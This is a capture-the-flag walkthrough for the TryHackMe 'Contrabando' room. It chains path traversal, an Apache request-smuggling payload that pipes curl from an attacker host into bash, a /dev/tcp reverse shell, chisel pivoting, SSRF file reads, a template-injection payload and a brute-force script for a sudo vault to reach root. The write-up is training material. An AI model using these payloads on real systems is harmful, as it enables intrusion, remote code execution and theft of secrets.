<h1 align="center">Contrabando</h1>
<p align="center">2025, August 25<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>476</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Never tell me the odds.</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/5a1e2441-6336-4ce2-8100-1032df5091bc"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/theblobblog">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/59e2be8c-2e4d-487c-8457-63f6a1a583b1"></p>

<br>
<br>

<h2>Task 1 . Capture the Flags!</h2>
<p>Our company was excited to release our new product, but a recent attack has forced us to go down for maintenance. They have asked you to conduct a vulnerability assessment to help identify how the attack occurred.<br>

Are you up for it?<br>

Great kid! Don't get cocky.<br>

Please allow the VM 5 minutes to fully boot up.</p>

<br>
<p><em>Answer the questions below</em></p>

<br>
<h2>Nikto</h2>

```bash
:~/Contrabando# nikto -h  xx.xxx.xx.xxx
...
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    contrabando.thm
+ Target Port:        80
+ Start Time:         2025-08-25 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.55 (Unix)
+ Server leaks inodes via ETags, header found with file /, fields: 0x39a 0x61bab54709d80 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-08-25 xx:x:xx (GMT1) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2>ping</h2>

```bash
:~/Contrabando# ping -c 4 xx.xxx.xx.xxx
PING xx.xxx.xx.xxx (xx.xxx.xx.xxx) 56(84) bytes of data.
64 bytes from xx.xxx.xx.xxx: icmp_seq=1 ttl=64 time=0.289 ms
64 bytes from xx.xxx.xx.xxx: icmp_seq=2 ttl=64 time=0.268 ms
64 bytes from xx.xxx.xx.xxx: icmp_seq=3 ttl=64 time=0.258 ms
64 bytes from xx.xxx.xx.xxx: icmp_seq=4 ttl=64 time=0.253 ms

--- xx.xxx.xx.xx ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3050ms
rtt min/avg/max/mdev = 0.253/0.267/0.289/0.013 ms
```

<h2>nmap</h2>

<p>

- 22 : ssh<br>
- 80 : http</p>

<br>

```bash
:~/Contrabando# nmap -sT -p- -T4 xx.xxx.xx.xxx
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
:~/Contrabando# nmap -A --min-rate=1000 xx.xxx.xx.xxx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.55 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.55 (Unix)
|_http-title: Site doesn't have a title (text/html).
```

<h2>ffuf</h2>

<p>

- index.html</p>

```bash
:~/Contrabando# ffuf -c -w /usr/share/dirb/wordlists/common.txt -u http://xx.xxx.xx.xxx/FUZZ
...
                        [Status: 200, Size: 922, Words: 131, Lines: 65]
index.html              [Status: 200, Size: 922, Words: 131, Lines: 65]
```

<h2>gobuster</h2>

```bash
:~/Contrabando# :~/Contrabando# gobuster dir -u http://xx.xxx.xx.xxx -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -t 100 --no-error -d 404,403
...
/index.html           (Status: 200) [Size: 922]
...
/.                    (Status: 200) [Size: 922]
```

<h2>Web</h2>

<img width="1131" height="384" alt="image" src="https://github.com/user-attachments/assets/2aefb82e-4662-4152-babc-c6bf260f566b" />

<br>
<p>

- /page/home.html</p>

<img width="1126" height="463" alt="image" src="https://github.com/user-attachments/assets/b7e7465b-8010-47dd-a2e1-ea305059fc9c" />

<br>
<br>
<h2>dirsearch</h2>

```bash
:~/Contrabando# dirsearch -u http://xx.xxx.xx.xxx/page/ -t 100 -i 200
[xx:xx:xx] 200 -  445B  - /page/home.html
[xx:xx:xx] 200 -  140B  - /page/index.php
```

<h2>/page/home.thml</h2>

<img width="1129" height="453" alt="image" src="https://github.com/user-attachments/assets/88fea11d-21b4-41f7-8e45-ddaa35c2d89e" />

<br>
<br>
<h2>/page/index.php</h2>

<img width="1169" height="529" alt="image" src="https://github.com/user-attachments/assets/9a16d1d0-1d87-46e6-8f53-47ddf95943bf" />

```bash
<?php 

$page = $_GET['page'];
if (isset($page)) {
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

<p>

- /index.php?page=home.html</p>

<img width="1125" height="154" alt="image" src="https://github.com/user-attachments/assets/94042e18-a9ab-411c-8537-a114df5032c0" />

<br>

<img width="1125" height="465" alt="image" src="https://github.com/user-attachments/assets/fa21dbd7-03e3-4a3c-bb50-1e7e55de66d2" />

<br>
<h2>/page/index.html ... opssss</h2>

<img width="1131" height="66" alt="image" src="https://github.com/user-attachments/assets/370572c8-130d-4f3c-bda0-bc79ac7b7ae1" />

<br>

<img width="1170" height="513" alt="image" src="https://github.com/user-attachments/assets/636ebd73-023c-48c2-89cd-6e4267639412" />

<br>
<br>
<h2>/page/home.html</h2>hs>

<img width="1129" height="471" alt="image" src="https://github.com/user-attachments/assets/f2ef5ecc-429d-40f7-af8a-fe453f92b71a" />

<br>
<br>
<h2>/page/var/www/html/index.php</h2>

<img width="1129" height="54" alt="image" src="https://github.com/user-attachments/assets/399d3dc8-8ebc-4777-91e1-04c6b0429972" />

<br>
<br>
<h2>/page/var/www/html/home.html</h2>

<img width="1129" height="54" alt="image" src="https://github.com/user-attachments/assets/97d410de-09dc-4a05-a224-1e59a5da5eba" />

<br>
<br>
<h2>GET /page/%252f/var/www/html/index.html</h2>

<img width="1171" height="458" alt="image" src="https://github.com/user-attachments/assets/2f4cc1d1-9ad0-479d-b100-163aa5a196f4" />


<br>
<br>
<h2>GET /page/%252f/etc/passwd</h2>

<img width="1124" height="480" alt="image" src="https://github.com/user-attachments/assets/781d2759-14ad-4a32-b330-5147b876f0e1" />

<br>
<br>
<h2>GET /page/http://AttackIP:8000</h2>

<img width="1136" height="478" alt="image" src="https://github.com/user-attachments/assets/2c36d569-5f7a-4ed3-b44d-e0bd59e03d07" />

<br>
<br>
<h2>/page/http:%252f%252fAttackIP:8000</h2>

<img width="1123" height="424" alt="image" src="https://github.com/user-attachments/assets/6d43b246-19f9-4da0-aeb1-a0f77d867d46" />

<br>

<img width="1382" height="189" alt="image" src="https://github.com/user-attachments/assets/29a0c66b-1fbd-4ff9-98d2-22f2572f2c8d" />

<br>
<br>
<h2>GET /page/%252f/etc/apache2/sites-available/000-default.conf</h2>

<p>

- VirtualHost = <code>8080</code><br>
-	ServerAdmin <code>webmaster@localhost</code><br>
- DocumentRoot <code>/var/www/html</code></p>

<img width="1056" height="548" alt="image" src="https://github.com/user-attachments/assets/b04e8b02-7924-4487-b3e0-9947c32203c7" />

<br>
<br>
<h2>ffuf</h2>
<p>

- /page/home.html/p>

```bash
:~/Contrabando# ffuf -u http://xx.xxx.xx.xxx/page/FUZZ.html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 100-203

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://xx.xxx.xx.xxx/page/FUZZ.html
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 100-203
________________________________________________

home                           [Status: 200, Size: 873, Words: 121, Lines: 63]
...
:: Progress: [218275/218275] :: Job [1/1] :: 2511 req/sec :: Duration: [0:04:19] :: Errors: 0 ::
```


<p>

- /page/gen.php</p>

```bash
:~/Contrabando# ffuf -u http://xx.xxx.xx.xxx/page/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 100-203
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://xx.xxx.xx.xxx/page/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 100-200
________________________________________________

gen                                       [Status: 200, Size: 392, Words: 65, Lines: 15]
...
:: Progress: [218275/218275] :: Job [1/1] :: 900 req/sec :: Duration: [0:03:56] :: Errors: 0 ::
```

<h2>GET /page/gen.php</h2>

<img width="1052" height="364" alt="image" src="https://github.com/user-attachments/assets/6c3a0331-af53-4d20-8071-2d25f65ace9e" />

<br>
<br>
<h2>GET /page/http:%252f%252flocalhost:8080/gen.php</h2>
<p>

- Please insert the length parameter in the URL</p>

<img width="1050" height="267" alt="image" src="https://github.com/user-attachments/assets/eae272e0-a2cd-4026-98ce-bd48f36c668b" />

<br>
<br>
<h2>CVE-2023-25690</h2>

<p>

- https://github.com/topics/cve-2023-25690-poc<br>
- Test for <code>HTTP Request Splitting causing HTTP Request Smuggling on backend service</code></p>


<h2>GET /page/index.php%20HTTP/1.1%0d%0aFoo:%29baarr</h2>

<img width="780" height="454" alt="image" src="https://github.com/user-attachments/assets/483cffc7-b5f7-4199-8310-fcce45755855" />

<br>
<br>

```bash
%20HTTP/1.1%0d%0aFoo:%20baarr
```

<img width="1084" height="346" alt="image" src="https://github.com/user-attachments/assets/11192f17-e4bb-4e62-a95c-f0c24b9dca6f" />

<br>
<br>
<h2>GET /page/index.php%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED</h2>

<img width="785" height="366" alt="image" src="https://github.com/user-attachments/assets/863cff01-38ae-4169-b229-29a52c39bba7" />

<br>

<img width="1219" height="326" alt="image" src="https://github.com/user-attachments/assets/f83db34f-bafe-47e7-83d0-b3db51f23d91" />

<br>
<br>
<h2>GET /page/localhost:8080/gen.php</h2>

<br>
<h2>GET /page/hello</h2>

<img width="1215" height="350" alt="image" src="https://github.com/user-attachments/assets/635709b5-0625-449d-9fe3-b367db0eb8ae" />

<br>
<br>
<h2>GET /page/hello%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED</h2>

<img width="1225" height="137" alt="image" src="https://github.com/user-attachments/assets/711d7505-ebdd-4721-923c-ff361988703a" />

<br>
<br>
<h2>rev.sh</h2>

```bash
bash -c 'bash -i >& /dev/tcp/xx.xxx.xx.xxx/9001 0>&1'
```

<h2>GET /page/hello%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0APOST%20/gen.php%20HTTP/1.1%0D%0AHost:%20localhost%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2037%0D%0A%0D%0Alength=;curl%20AttackIP:8000%7Cbash;%0D%0A%0D%0AGET%20/hello HTTP/1.1</h2>

<img width="1208" height="336" alt="image" src="https://github.com/user-attachments/assets/a3dd6825-269d-4309-939a-ce79ef7a9a9f" />

 ```bash
:~/Contrabando# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xxx - - [25/Aug/2025 xx:xx:xx] "GET / HTTP/1.0" 200 -
xx.xxx.xx.xxx - - [25/Aug/2025 xx:xx:xx] "GET / HTTP/1.1" 200 -
```

```bash
:~/Contrabando# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on xx.xxx.xx.xxx 38052
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@124a042cc76c:/var/www/html$ ls
ls
gen.php
home.html
index.php
sky.jpeg
www-data@124a042cc76c:/var/www/html$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@124a042cc76c:/var/www/html$ ^Z
[1]+  Stopped                 nc -nlvp 9001
:~/Contrabando# stty raw -echo; fg
nc -nlvp 9001
www-data@124a042cc76c:/var/www/html$ export TERM=xterm
www-data@124a042cc76c:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<img width="1096" height="414" alt="image" src="https://github.com/user-attachments/assets/1e2980d4-cdf6-4180-861e-d2de7dde1ecc" />

<br>
<br>

```bash
www-data@124a042cc76c:/var/www/html$ getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
172.18.0.3      124a042cc76c
```

<h2>nmap</h2>

```bash
:~/Contrabando# wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
--2025-08-25 xx:xx:xx--  https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
```

```bash
www-data@124a042cc76c:/tmp$ curl AttackIP:8000/nmap-x64.tar.gz -o nmap-x
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10.1M  100 10.1M    0     0   139M      0 --:--:-- --:--:-- --:--:--  139M
```

```bash
www-data@124a042cc76c:/dev/shm$ tar -xzf nmap-x64.tar.gz
```

```bash
www-data@124a042cc76c:/tmp$ ls
full-scan.sh	   nmap-payloads	nmap-x64.tar.gz  nselib
ncat		   nmap-protocols	nmap.dtd	 scan-port.sh
nmap		   nmap-rpc		nmap.xsl	 scan.sh
nmap-mac-prefixes  nmap-service-probes	nping		 scripts
nmap-os-db	   nmap-services	nse_main.lua
```

```bash
www-data@124a042cc76c:/tmp$ ./nmap 172.18.0.0/16 -sn --min-rate=5500 -n
...
Nmap scan report for 172.18.0.1
Host is up (0.0020s latency).
Nmap scan report for 172.18.0.2
Host is up (0.0012s latency).
Nmap scan report for 172.18.0.3
Host is up (0.00070s latency).
Nmap done: 65536 IP addresses (3 hosts up) scanned in 30.44 seconds
```

```bash
www-data@124a042cc76c:/tmp$ ./nmap 172.18.0.2 -p- --min-rate=5500 -n -vvv
...
Discovered open port 80/tcp on 172.18.0.2
...
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

```bash
www-data@124a042cc76c:/tmp$ ./nmap 172.18.0.1 -p- --min-rate=5500 -n -vvv
...
Discovered open port 80/tcp on 172.18.0.1
Discovered open port 22/tcp on 172.18.0.1
Discovered open port 5000/tcp on 172.18.0.1
...
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
5000/tcp open  upnp    syn-ack
```

<h2>5000</h2>

```bash
www-data@124a042cc76c:/tmp$ curl 172.18.0.1:5000
<!DOCTYPE html>
<html>
<head>
    <title>Website Display</title>
</head>
<body>
    <h1>Fetch Website Content</h1>
    <h2>Currently in Development</h2>
    <form method="POST">
        <label for="website_url">Enter Website URL:</label>
        <input type="text" name="website_url" id="website_url" required>
        <button type="submit">Fetch Website</button>
    </form>
    <div>
        
    </div>
</body>
</html>
```

<h2>chisel</h2>

```bash
www-data@124a042cc76c:/tmp$ curl http://AttackIP:8000/chisel -o chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8144k  100 8144k    0     0   176M      0 --:--:-- --:--:-- --:--:--  176M
```

```bash
www-data@124a042cc76c:/tmp$ chmod +x chisel
```

<img width="1101" height="217" alt="image" src="https://github.com/user-attachments/assets/ad688bf1-6a4f-4eb0-9f6e-cec861368d9a" />

<br>

<img width="1098" height="185" alt="image" src="https://github.com/user-attachments/assets/62837deb-b4de-45f3-ac23-88757def3306" />

<br>
<br>
<h2>localhost:5000</h2>

<img width="1535" height="300" alt="image" src="https://github.com/user-attachments/assets/3bbb6fce-737c-4dae-9cbf-7f1867e1f665" />

<br>

<img width="1366" height="226" alt="image" src="https://github.com/user-attachments/assets/8625d3a7-0f26-4392-a829-c7f46182a163" />

<br>

<img width="1284" height="214" alt="image" src="https://github.com/user-attachments/assets/54095118-56ae-46b3-ab98-8a612d2d4f41" />

<br>
<br>

```bash
:~/Contrabando# nc -nlvp 6666
Listening on 0.0.0.0 6666
Connection received on xx.xxx.xx.xxx 50502
GET / HTTP/1.1
Host: xx.xxx.xx.xxx:6666
User-Agent: PycURL/7.45.2 libcurl/7.68.0 OpenSSL/1.1.1f zlib/1.2.11 brotli/1.0.7 libidn2/2.2.0 libpsl/0.21.0 (+libidn2/2.2.0) libssh/0.9.3/openssl/zlib nghttp2/1.40.0 librtmp/2.3
Accept: */*
```

<img width="1286" height="209" alt="image" src="https://github.com/user-attachments/assets/21d93437-fe26-4541-b8ec-8a54472a00a0" />

<br>
<br>

```bash
:~/Contrabando# curl localhost:5000 -s -X POST -d 'website_url=file:///etc/passwd' | html2text | grep sh
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
false fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:
lxd:/bin/false hansolo:x:1000:1000::/home/hansolo:/bin/bash
```

<h2>file:///etc/passwd'</h2>

<img width="1362" height="229" alt="image" src="https://github.com/user-attachments/assets/e534d12e-4462-4c37-a618-1a527bd8a854" />

<br>
<br>
<h2>file:///proc/self/status</h2

<img width="1233" height="408" alt="image" src="https://github.com/user-attachments/assets/b7c8f090-2937-4a25-8618-49fb2e92639d" />

<br>
<br>
<p>

- /usr/bin/python3/home/hansolo/app/app.py </p>

<img width="1362" height="229" alt="image" src="https://github.com/user-attachments/assets/35c7ec6c-d66d-4e3a-8dcb-5d2e25afabe8" />

<br>
<br>
<h2>file:///home/hansolo/app/app.py</h2>

<img width="1367" height="478" alt="image" src="https://github.com/user-attachments/assets/6b492df7-ccd4-4531-b78d-1374dc8c35a0" />

<br>

<img width="1227" height="655" alt="image" src="https://github.com/user-attachments/assets/a878b34f-205b-4737-a609-fa8ecc30678e" />

<br>
<br>
<h2>Reverse Shell</h2>

```bash
$ cat template {{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl xx.xxx.xx.xxx:5555|bash').read() }}
```

<h2>hansolo</h2>

```bash
:~/Contrabando# nc -nlvp 1235
Listening on 0.0.0.0 1235
Connection received on xx.xxx.xx.xxx 56854
bash: cannot set terminal process group (728): Inappropriate ioctl for device
bash: no job control in this shell
hansolo@contrabando:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
hansolo@contrabando:~$ ^Z
[1]+  Stopped                 nc -nlvp 1235
:~/Contrabando# stty raw -echo; fg
nc -nlvp 1235

hansolo@contrabando:~$ export TERM=xterm
hansolo@contrabando:~$ id
id
uid=1000(hansolo) gid=1000(hansolo) groups=1000(hansolo)
hansolo@contrabando:~$ pwd
pwd
/home/hansolo
```

```bash
hansolo@contrabando:~$ ls
ls
app
hansolo_userflag.txt
hansolo@contrabando:~$ cat hansolo_userflag.txt
cat hansolo_userflag.txt
THM{******************************}
```

<br>

<p>1.1. What is the first flag?<br>
<code>THM{******************************}</code></p>

<br>
<br>
<h2>hansolo´s privileges</h2>

```bash
hansolo@contrabando:~$ sudo -l
Matching Defaults entries for hansolo on contrabando:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hansolo may run the following commands on contrabando:
    (root) NOPASSWD: /usr/bin/bash /usr/bin/vault
    (root) /usr/bin/python* /opt/generator/app.py
```

<br>
<br>
<h2>vault</h2>

```bash
hansolo@contrabando:/usr/bin$ cat vault
#!/bin/bash

check () {
        if [ ! -e "$file_to_check" ]; then
            /usr/bin/echo "File does not exist."
            exit 1
        fi
        compare
}


compare () {
        content=$(/usr/bin/cat "$file_to_check")

        read -s -p "Enter the required input: " user_input

        if [[ $content == $user_input ]]; then
            /usr/bin/echo ""
            /usr/bin/echo "Password matched!"
            /usr/bin/cat "$file_to_print"
        else
            /usr/bin/echo "Password does not match!"
        fi
}

file_to_check="/root/password"
file_to_print="/root/secrets"

check
```

<br>

```bash
hansolo@contrabando:/usr/bin$ echo "hey" | sudo /usr/bin/bash /usr/bin/vault
Password does not match!
hansolo@contrabando:/usr/bin$ echo "*" | sudo /usr/bin/bash /usr/bin/vault

Password matched!
1. Lightsaber Colors: Lightsabers in Star Wars can come in various colors, and the color often signifies the Jedi's role or affiliation. For example, blue and green lightsabers are commonly associated with Jedi Knights, while red lightsabers are typically used by Sith. However, there are exceptions, and the color can also represent other factors.

2. Darth Vader's Breathing: The iconic sound of Darth Vader's breathing was created by sound designer Ben Burtt. He achieved this effect by recording himself breathing through a scuba regulator. The sound became one of the most recognizable and menacing elements of the character.

3. Ewok Language: The Ewoks, the small furry creatures from the forest moon of Endor in "Return of the Jedi," speak a language called Ewokese. The language is a combination of various Tibetan, Nepalese, and Kalmyk phrases, as well as some manipulated dialogue from the Quechua language.

4. Han Solo's Carbonite Freeze: In "Star Wars: Episode V - The Empire Strikes Back," Han Solo is frozen in carbonite. The famous line, "I love you," "I know," was actually improvised by Harrison Ford. The original script had Han responding with "I love you too," but Ford felt that Han's character wouldn't say that, so he ad-libbed the now-famous line.

5. Yoda's Species and Name: Yoda's species and homeworld are never revealed in the Star Wars films, and George Lucas has been adamant about keeping this information a mystery. Additionally, the name "Yoda" was chosen simply because George Lucas liked the sound of it.
```

<br>

```bash
hansolo@contrabando:/usr/bin$ sudo /usr/bin/bash /usr/bin/vault
Enter the required input: 
Password matched!
1. Lightsaber Colors: Lightsabers in Star Wars can come in various colors, and the color often signifies the Jedi's role or affiliation. For example, blue and green lightsabers are commonly associated with Jedi Knights, while red lightsabers are typically used by Sith. However, there are exceptions, and the color can also represent other factors.

2. Darth Vader's Breathing: The iconic sound of Darth Vader's breathing was created by sound designer Ben Burtt. He achieved this effect by recording himself breathing through a scuba regulator. The sound became one of the most recognizable and menacing elements of the character.

3. Ewok Language: The Ewoks, the small furry creatures from the forest moon of Endor in "Return of the Jedi," speak a language called Ewokese. The language is a combination of various Tibetan, Nepalese, and Kalmyk phrases, as well as some manipulated dialogue from the Quechua language.

4. Han Solo's Carbonite Freeze: In "Star Wars: Episode V - The Empire Strikes Back," Han Solo is frozen in carbonite. The famous line, "I love you," "I know," was actually improvised by Harrison Ford. The original script had Han responding with "I love you too," but Ford felt that Han's character wouldn't say that, so he ad-libbed the now-famous line.

5. Yoda's Species and Name: Yoda's species and homeworld are never revealed in the Star Wars films, and George Lucas has been adamant about keeping this information a mystery. Additionally, the name "Yoda" was chosen simply because George Lucas liked the sound of it.
```

<h2>/tmp</h2>
<p><em>a.py</em></p>

<a href="https://jaxafed.github.io/posts/tryhackme-contrabando/">Jaxafed</a>, thank you!<h6>

```bash
import subprocess
import string

charset = string.ascii_letters + string.digits
password = ""

while True:
    found = False
    for char in charset:
        attempt = password + char + "*"
        print(f"\r[+] Password: {password+char}", end="")
        proc = subprocess.Popen(
            ["sudo", "/usr/bin/bash", "/usr/bin/vault"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = proc.communicate(input=attempt + "\n")
        if "Password matched!" in stdout:
            password += char
            found = True
            break
    if not found:
        break

print(f"\r[+] Final Password: {password}")
```

<br>

```bash
hansolo@contrabando:/usr/bin$ python3 a.py > this
hansolo@contrabando:/usr/bin$ cat this
EQu5*******Z
```

<br>

<img width="1237" height="52" alt="image" src="https://github.com/user-attachments/assets/e61cce1d-93d2-4839-a846-18b4bfb7d3a2" />

<br>
<br>
<h2>app.py</h2>

```bash
hansolo@contrabando:/opt/generator$ cat app.py
```


<p>

- remember from hansolo´s privilege section ...(root) /usr/bin/python* /opt/generator/app.py</p>


<img width="1244" height="478" alt="image" src="https://github.com/user-attachments/assets/0ab8bd31-7da3-46f9-9532-ab3a1fcd1168" />

<br>
<br>
<h2>Python Versions</h2>

<p>

- in python2 the input() function behaves like eval(raw_input())</p>

<img width="1248" height="240" alt="image" src="https://github.com/user-attachments/assets/725d20fe-2ea5-40e4-a65a-c97ff1395c17" />

<br>
<br>
<h2>root</h2>

```bash
hansolo@contrabando:/opt/generator$ sudo /usr/bin/python2 /opt/generator/app.py
```

<img width="1243" height="225" alt="image" src="https://github.com/user-attachments/assets/16ad50b3-2ddf-49fe-897e-18503e072a2a" />

<br>
,br>

<p>1.2. What is the second flag?<br>
<code>THM{***...}</code></p>


<br>
<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/f7ef90bd-023b-45ad-a0bf-d98852a80b4e"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/3c2e2a77-8a39-4205-97d2-be1886aff11d"></p>


<br>
<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 25   | 476      |     115ᵗʰ    |      5ᵗʰ     |     265ᵗʰ   |     6ᵗʰ    | 122,750  |    926    |    73     |

</div>


<p align="center">Global All Time:   115ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/f9aea16a-365b-4e6e-a353-7b7be736e23c"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/0de53fb7-0f6d-4a4d-bce2-33972dd47bfd"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/fa434319-7931-466a-8100-a4f0985a21a4"><br>
                  Global monthly:    265ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/18b0f839-1158-4d28-89a1-326ef44bf88e"><br>
                  Brazil monthly:      6ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/44920e66-3c60-4f0f-acf6-2eaa56a24394"><br>

<br>
<br>

<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
